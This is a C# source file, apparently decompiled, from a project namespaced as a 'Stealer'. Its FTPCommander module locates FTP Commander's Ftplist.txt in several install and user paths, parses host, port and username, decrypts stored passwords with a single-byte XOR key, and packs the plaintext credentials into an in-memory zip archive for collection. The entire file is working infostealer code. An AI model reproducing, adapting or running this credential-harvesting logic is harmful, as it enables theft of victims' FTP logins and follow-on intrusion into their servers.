using dominion.src.dominion.Dependencies.Data;
using dominion.src.dominion.Dependencies.Encryption;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace dominion.src.dominion.Stealer.Applications
{
    public class FTPCommander : ITarget
    {
        // Token: 0x0600019D RID: 413 RVA: 0x0000E204 File Offset: 0x0000C404
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string[] array = new string[]
            {
                "C:\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt",
                "C:\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
                "C:\\cftp\\Ftplist.txt",
                "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander\\Ftplist.txt",
                "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\VirtualStore\\Program Files (x86)\\FTP Commander Deluxe\\Ftplist.txt"
            };
            Counter.CounterApplications counterApplications = new Counter.CounterApplications
            {
                Name = "FTPCommander"
            };
            List<string> list = new List<string>();
            foreach (string text in array)
            {
                if (File.Exists(text))
                {
                    foreach (string text2 in File.ReadAllLines(text))
                    {
                        if (!string.IsNullOrWhiteSpace(text2))
                        {
                            string[] array4 = text2.Split(new char[]
                            {
                                ';'
                            });
                            if (array4.Length >= 6)
                            {
                                string text3 = array4[1].Split(new char[]
                                {
                                    '='
                                })[1];
                                string text4 = array4[2].Split(new char[]
                                {
                                    '='
                                })[1];
                                string input = array4[3].Split(new char[]
                                {
                                    '='
                                })[1];
                                string text5 = array4[4].Split(new char[]
                                {
                                    '='
                                })[1];
                                if (!(array4[5].Split(new char[]
                                {
                                    '='
                                })[1] != "0"))
                                {
                                    string text6 = Xor.DecryptString(input, 25);
                                    list.Add(string.Concat(new string[]
                                    {
                                        "Url: ",
                                        text3,
                                        ":",
                                        string.IsNullOrEmpty(text4) ? "21" : text4,
                                        "\nUsername: ",
                                        text5,
                                        "\nPassword: ",
                                        text6,
                                        "\n"
                                    }));
                                    string str = "FTP Commander\\Hosts.txt";
                                    counterApplications.Files.Add(text + " => " + str);
                                }
                            }
                        }
                    }
                }
            }
            if (list.Count > 0)
            {
                string text7 = "FTP Commander\\Hosts.txt";
                zip.AddFile(text7, Encoding.UTF8.GetBytes(string.Join("\n", list)));
                counterApplications.Files.Add(text7 ?? "");
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
